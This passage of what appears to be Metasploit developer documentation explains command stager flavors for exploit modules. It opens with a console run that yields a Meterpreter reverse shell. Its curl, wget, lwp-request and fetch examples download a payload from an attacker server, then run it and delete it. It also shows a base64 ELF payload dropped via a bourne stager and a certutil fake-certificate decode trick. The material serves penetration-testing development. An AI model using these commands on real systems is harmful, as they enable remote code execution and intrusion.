</code></pre></div></div><p>And let’s run that, we should have a shell:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> exploit<span class="p">(</span><span class="kc">cmdstager_demo</span><span class="p">)</span> <span class="p">&gt;</span> run

<span class="zs">[*]</span> Started reverse TCP handler on 10.6.0.92:4444
<span class="zs">[*]</span> Exploiting...
<span class="zs">[*]</span> Transmitting intermediate stager for over-sized stage...(105 bytes)
<span class="zs">[*]</span> Sending stage (1495599 bytes) to 10.6.0.92
<span class="zs">[*]</span> Meterpreter session 1 opened (10.6.0.92:4444 -&gt; 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
</code></pre></div></div><h1 id="flavors"> <a href="#flavors" class="anchor-heading" aria-labelledby="flavors"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Flavors</h1><p>Now that we know how to use the <code class="language-plaintext highlighter-rouge">Msf::Exploit::CmdStager</code> mixin, let’s take a look at the command stagers you can use. As mentioned above there are 2 general approaches to staging an executable on disk: by invoking a command that will download the executable file to disk like wget, curl, or fetch, or by breaking the executable file into pieces and including them commands themselves to write it to disk like echo, printf, or vbs. This delineation can be important, as trying to write a stageless binary payload to disk using a stager that has to include the chunked payload in it will require the execution of dozens of commands, often each one having the signature of the exploit. It is also useful to know the <code class="language-plaintext highlighter-rouge">printf</code> flavor is the only flavor that embeds the payload into the commands but does <strong><em>not</em></strong> use <code class="language-plaintext highlighter-rouge">echo</code>.</p><p>Available flavors:</p><p>Flavors requiring the payload to be broken apart and embedded into the commands:</p><ul><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/bourne.rb">bourne</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/certutil.rb">certutil</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_asm.rb">debug_asm</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_write.rb">debug_write</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/echo.rb">echo</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/printf.rb">printf</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/vbs.rb">vbs</a></ul><p>Flavors that rely on using a command to retrieve the payload via network connection</p><ul><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/curl.rb">curl</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/fetch.rb">fetch</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/lwprequest.rb">lwprequest</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/psh_invokewebrequest.rb">psh_invokewebrequest</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/tftp.rb">tftp</a><li><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/wget.rb">wget</a></ul><h2 id="vbs-command-stager---windows-only"> <a href="#vbs-command-stager---windows-only" class="anchor-heading" aria-labelledby="vbs-command-stager---windows-only"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> VBS Command Stager - Windows Only</h2><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/vbs.rb">VBS command stager</a> is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a <a href="https://github.com/rapid7/rex-exploitation/blob/master/data/exploits/cmdstager/vbs_b64">VBS script</a> using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it.</p><p>If you are exploiting Windows that supports Powershell, then you might want to <a href="/docs/development/developing-modules/libraries/how-to-use-powershell-in-an-exploit.html">consider using that instead</a> of the VBS stager, because Powershell tends to be more stealthy.</p><p>To use the VBS stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'vbs'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :vbs key to execute_cmdstager:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :vbs</span><span class="p">)</span>
</code></pre></div></div><p>You will also need to make sure the module’s supported platforms include windows (also in the metadata), example:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span>
</code></pre></div></div><h2 id="certutil-command-stager---windows-only"> <a href="#certutil-command-stager---windows-only" class="anchor-heading" aria-labelledby="certutil-command-stager---windows-only"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Certutil Command Stager - Windows Only</h2><p><a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/certutil.rb">Certutil</a> is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back up and restore CA components, etc. It only comes with newer Windows systems starting from Windows 2012, and Windows 8. I find the certutil flavor confusing, as certutil can be used to download files just like <code class="language-plaintext highlighter-rouge">wget</code> and <code class="language-plaintext highlighter-rouge">ftp</code>, we do not use it that way here; instead we use <code class="language-plaintext highlighter-rouge">echo</code> to write the file as a base64 encoded certificate, and then we use <code class="language-plaintext highlighter-rouge">certutil</code> to decode it prior to execution:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-----BEGIN</span> CERTIFICATE----- <span class="o">&gt;</span> encoded.txt
<span class="nb">echo </span>Just Base64 encode your binary data
<span class="nb">echo </span><span class="nv">TVoAAA</span><span class="o">==</span> <span class="o">&gt;&gt;</span> encoded.txt
<span class="nb">echo</span> <span class="nt">-----END</span> CERTIFICATE----- <span class="o">&gt;&gt;</span> encoded.txt
certutil <span class="nt">-decode</span> encoded.txt decoded.bin
</code></pre></div></div><p>To take advantage of that, the Certutil command stager will save the payload in Base64 as a fake certificate, ask certutil to decode it, and then finally execute it.</p><p>To use the Certutil command stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'certutil'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :certutil key to execute_cmdstager:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :certutil</span><span class="p">)</span>
</code></pre></div></div><p>You will also need to remember to set the platform in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span>
</code></pre></div></div><h2 id="debug_write-command-stager---windows-only"> <a href="#debug_write-command-stager---windows-only" class="anchor-heading" aria-labelledby="debug_write-command-stager---windows-only"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Debug_write Command Stager - Windows Only</h2><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_write.rb">debug_write</a> command stager is an old Windows trick to write a file to the system. In this case, we use debug.exe to write a small .Net binary, and that binary will take a hex-ascii file created by the echo command, decode the binary, and finally execute.</p><p>Obviously, to be able to use this command stager, you must make sure the target is a Windows system that supports .Net.</p><p>To use the debug_write command stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'debug_write'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :debug_write key to execute_cmdstager:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :debug_write</span><span class="p">)</span>
</code></pre></div></div><p>You will also need to remember to set the platform in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span>
</code></pre></div></div><h2 id="debug_asm-command-stager---windows-only"> <a href="#debug_asm-command-stager---windows-only" class="anchor-heading" aria-labelledby="debug_asm-command-stager---windows-only"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Debug_asm Command Stager - Windows Only</h2><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_asm.rb">debug_asm</a> command stager is another old Windows trick used to assemble a COM file, and then COM file will decode our hex-ascii payload, and then execute it.</p><p>To use the debug_asm command stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'debug_asm'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :debug_asm key to execute_cmdstager:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :debug_asm</span><span class="p">)</span>
</code></pre></div></div><p>You will also need to remember to set the platform in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span>
</code></pre></div></div><h2 id="tftp-command-stager---windows-only"> <a href="#tftp-command-stager---windows-only" class="anchor-heading" aria-labelledby="tftp-command-stager---windows-only"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> TFTP Command Stager - Windows Only</h2><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/tftp.rb">TFTP</a> command stager uses tftpd.exe to download our payload, and then use the start.exe command to execute it. This technique only works well against an older version of Windows (such as XP), because newer Windows machines no longer install tftp.exe by default.</p><p>The TFTP command stager must bind to UDP port 69, so msfconsole must be started as root:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rvmsudo ./msfconsole
</code></pre></div></div><p>To use the TFTP stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'tftp'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :tftp key to execute_cmdstager:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :tftp</span><span class="p">)</span>
</code></pre></div></div><p>You will also need to remember to set the platform in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span>
</code></pre></div></div><h2 id="powershell-invoke-webrequest---windows-only"> <a href="#powershell-invoke-webrequest---windows-only" class="anchor-heading" aria-labelledby="powershell-invoke-webrequest---windows-only"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PowerShell Invoke-WebRequest - Windows Only</h2><p>To use the PowerShell Invoke-WebRequest stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'psh_invokewebrequest'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :psh_invokewebrequest key to execute_cmdstager:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :psh_invokewebrequest</span> <span class="p">)</span>
</code></pre></div></div><h2 id="bourne-command-stager---multi-platform"> <a href="#bourne-command-stager---multi-platform" class="anchor-heading" aria-labelledby="bourne-command-stager---multi-platform"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bourne Command Stager - Multi Platform</h2><p><strong>Linemax</strong> minimum: 373</p><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/bourne.rb">Bourne</a> command stager supports multiple platforms except for Windows. Just like many other stagers, it writes a base64 encoded payload to disk, but then it tries to decode it using four different commands: base64, openssl, python, and perl. This is very useful if the target’s OS is unpredictable. You can see the way it attempts to use multiple decoding techniques by setting <code class="language-plaintext highlighter-rouge">verbose</code> to <code class="language-plaintext highlighter-rouge">true</code> and launching an exploit that has <code class="language-plaintext highlighter-rouge">bourne</code> as a supported command stager flavor and selecting it as the flavor:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Generated command stager: ["echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAA
AAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoK
QVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXAoFh8lRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+
Wg8FSIXAeO3/5g==&gt;&gt;'/tmp/XtMnQ.b64' ; ((which base64 &gt;&amp;2 &amp;&amp; base64 -d -) || (which base64 &gt;&amp;2 &amp;&amp; base64 --decode -) || (w
hich openssl &gt;&amp;2 &amp;&amp; openssl enc -d -A -base64 -in /dev/stdin) || (which python &gt;&amp;2 &amp;&amp; python -c 'import sys, base64; pri
nt base64.standard_b64decode(sys.stdin.read());') || (which perl &gt;&amp;2 &amp;&amp; perl -MMIME::Base64 -ne 'print decode_base64($_)
')) 2&gt; /dev/null &gt; '/tmp/IPUov' &lt; '/tmp/XtMnQ.b64' ; chmod +x '/tmp/IPUov' ; '/tmp/IPUov' ; rm -f '/tmp/IPUov' ; rm -f '
/tmp/XtMnQ.b64'"]
</code></pre></div></div><p>To use the Bourne stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'bourne'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :bourne key to execute_cmdstager:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :bourne</span><span class="p">)</span>
</code></pre></div></div><h2 id="echo-command-stager---multi-platform"> <a href="#echo-command-stager---multi-platform" class="anchor-heading" aria-labelledby="echo-command-stager---multi-platform"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Echo Command Stager - Multi Platform</h2><p><strong>Linemax</strong> minimum: 26</p><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/echo.rb">echo</a> command stager is suitable for multiple platforms except for Windows. It just <a href="http://manpages.ubuntu.com/manpages/trusty/man1/echo.1fun.html">echos</a> the payload, chmod and execute it. An example of that looks similar to this:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-en</span> <span class="se">\\</span>x41<span class="se">\\</span>x41<span class="se">\\</span>x41<span class="se">\\</span>x41 <span class="o">&gt;&gt;</span> /tmp/payload <span class="p">;</span> <span class="nb">chmod </span>777 /tmp/payload <span class="p">;</span> /tmp/payload <span class="p">;</span> <span class="nb">rm</span> <span class="nt">-f</span> /tmp/payload
</code></pre></div></div><p>To use the echo stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'echo'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :echo key to execute_cmdstager:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :echo</span><span class="p">)</span>
</code></pre></div></div><h2 id="printf-command-stager---multi-platform"> <a href="#printf-command-stager---multi-platform" class="anchor-heading" aria-labelledby="printf-command-stager---multi-platform"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Printf Command Stager - Multi Platform</h2><p><strong>Linemax</strong> minimum: 25</p><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/printf.rb">printf</a> command stager is also suitable for multiple platforms except for Windows. It just uses the printf command to write the payload to disk, chmod and execute it. An example of that looks similar to this:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf '\177\177\177\177' &gt;&gt; /tmp/payload ; chmod +x /tmp/payload ; /tmp/payload ; rm -f /tmp/payload
</code></pre></div></div><p>To use the printf stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'printf'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :printf key to <code class="language-plaintext highlighter-rouge">execute_cmdstager</code>:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :printf</span><span class="p">)</span>
</code></pre></div></div><h2 id="curl-command-stager---multi-platform"> <a href="#curl-command-stager---multi-platform" class="anchor-heading" aria-labelledby="curl-command-stager---multi-platform"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> cURL Command Stager - Multi Platform</h2><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/curl.rb">cURL</a> command stager uses the <code class="language-plaintext highlighter-rouge">curl</code> command on the target host to download the payload file. It requires users to specify a <code class="language-plaintext highlighter-rouge">SRVHOST</code> and <code class="language-plaintext highlighter-rouge">SRVPORT</code> values and will start an HTTP server to host the payload file. An example of that looks similar to this:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-so</span> /tmp/dtNGlaaL http://10.5.135.201:8080/mdkwKcdGCtU<span class="p">;</span><span class="nb">chmod</span> +x /tmp/dtNGlaaL<span class="p">;</span>/tmp/dtNGlaaL<span class="p">;</span><span class="nb">rm</span> <span class="nt">-f</span> /tmp/dtNGlaaL<span class="s2">"
</span></code></pre></div></div><p>To use the cURL stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'curl'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :curl key to <code class="language-plaintext highlighter-rouge">execute_cmdstager</code>:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :curl</span><span class="p">)</span>
</code></pre></div></div><h2 id="wget-command-stager---multi-platform"> <a href="#wget-command-stager---multi-platform" class="anchor-heading" aria-labelledby="wget-command-stager---multi-platform"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> wget Command Stager - Multi Platform</h2><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/wget.rb">wget</a> command stager is similar to the curl command stager, except instead of using curl to download the file on the target host, it uses the <code class="language-plaintext highlighter-rouge">wget</code> command. It requires users to specify a <code class="language-plaintext highlighter-rouge">SRVHOST</code> and <code class="language-plaintext highlighter-rouge">SRVPORT</code> values and will start an HTTP server to host the payload file. An example of that looks similar to this:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">-qO</span> /tmp/MZXxujch http://10.5.135.201:8080/mdkwKcdGCtU<span class="p">;</span><span class="nb">chmod</span> +x /tmp/MZXxujch<span class="p">;</span>/tmp/MZXxujch<span class="p">;</span><span class="nb">rm</span> <span class="nt">-f</span> /tmp/MZXxujch
</code></pre></div></div><p>To use the wget stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'wget'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :wget key to <code class="language-plaintext highlighter-rouge">execute_cmdstager</code>:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :wget</span><span class="p">)</span>
</code></pre></div></div><h2 id="lwp-request-command-stager---multi-platform"> <a href="#lwp-request-command-stager---multi-platform" class="anchor-heading" aria-labelledby="lwp-request-command-stager---multi-platform"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> LWP Request Command Stager - Multi Platform</h2><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/lwprequest.rb">lwp-request</a> command stager is similar to the curl command stager, except instead of using curl to download the file on the target host, it uses the <code class="language-plaintext highlighter-rouge">lwp-request</code> command. It requires users to specify a <code class="language-plaintext highlighter-rouge">SRVHOST</code> and <code class="language-plaintext highlighter-rouge">SRVPORT</code> values and will start an HTTP server to host the payload file. An example of that looks similar to this:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lwp-request <span class="nt">-m</span> GET http://10.5.135.201:8080/mdkwKcdGCtU <span class="o">&gt;</span> /tmp/OKOnDYwn<span class="p">;</span><span class="nb">chmod</span> +x /tmp/OKOnDYwn<span class="p">;</span>/tmp/OKOnDYwn<span class="p">;</span><span class="nb">rm</span> <span class="nt">-f</span> /tmp/OKOnDYwn

</code></pre></div></div><p>To use the lwprequest stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'lwprequest'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :lwprequest key to <code class="language-plaintext highlighter-rouge">execute_cmdstager</code>:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :lwprequest</span><span class="p">)</span>
</code></pre></div></div><h2 id="fetch-command-stager---bsd-only"> <a href="#fetch-command-stager---bsd-only" class="anchor-heading" aria-labelledby="fetch-command-stager---bsd-only"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Fetch Command Stager - BSD Only</h2><p>The <a href="https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/fetch.rb">fetch</a> command stager is similar to the curl command stager, except instead of using curl to download the file on the target host, it uses the <code class="language-plaintext highlighter-rouge">fetch</code> command. It requires users to specify a <code class="language-plaintext highlighter-rouge">SRVHOST</code> and <code class="language-plaintext highlighter-rouge">SRVPORT</code> values and will start an HTTP server to host the payload file. An example of that looks similar to this:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fetch <span class="nt">-qo</span> /tmp/UGWuPPcy http://10.5.135.201:8080/mdkwKcdGCtU<span class="p">;</span><span class="nb">chmod</span> +x /tmp/UGWuPPcy<span class="p">;</span>/tmp/UGWuPPcy<span class="p">;</span><span class="nb">rm</span> <span class="nt">-f</span> /tmp/UGWuPPcy
</code></pre></div></div><p>To use the fetch stager, either specify your CmdStagerFlavor in the metadata:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'fetch'</span> <span class="p">]</span>
</code></pre></div></div><p>Or set the :fetch key to <code class="language-plaintext highlighter-rouge">execute_cmdstager</code>:</p><div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :fetch</span><span class="p">)</span>
</code></pre></div></div><hr><footer><p><a href="#top" id="back-to-top">Back to top</a></p><p class="text-small text-grey-dk-000 mb-0"> <a href="https://github.com/rapid7/metasploit-framework/tree/master/docs/metasploit-framework.wiki/How-to-use-command-stagers.md" id="edit-this-page">Edit this page on GitHub</a></p></footer></div></div><div class="search-overlay"></div></div><script type="text/javascript" src="/assets/js/toggle_mode.js"></script> <script> var config = { theme: 'default', logLevel: 'fatal', securityLevel: 'strict', startOnLoad: true, arrowMarkerAbsolute: false, er: { diagramPadding: 20, layoutDirection: 'TB', minEntityWidth: 100, minEntityHeight: 75, entityPadding: 15, stroke: 'gray', fill: 'honeydew', fontSize: 12, useMaxWidth: true, }, flowchart:{ diagramPadding: 8, htmlLabels: true, curve: 'basis', }, sequence: { diagramMarginX: 50, diagramMarginY: 10, actorMargin: 50, width: 150, height: 65, boxMargin: 10, boxTextMargin: 5, noteMargin: 10, messageMargin: 35, messageAlign: 'center', mirrorActors: true, bottomMarginAdj: 1, useMaxWidth: true, rightAngles: false, showSequenceNumbers: false, }, gantt: { titleTopMargin: 25, barHeight: 20, barGap: 4, topPadding: 50, leftPadding: 75, fontSize: 11, gridLineStartPadding: 35, fontFamily: '\'Open Sans\', sans-serif', numberSectionStyles: 4, axisFormat: '%Y-%m-%d', topAxis: false, }, }; mermaid.initialize(config); window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid')); </script>
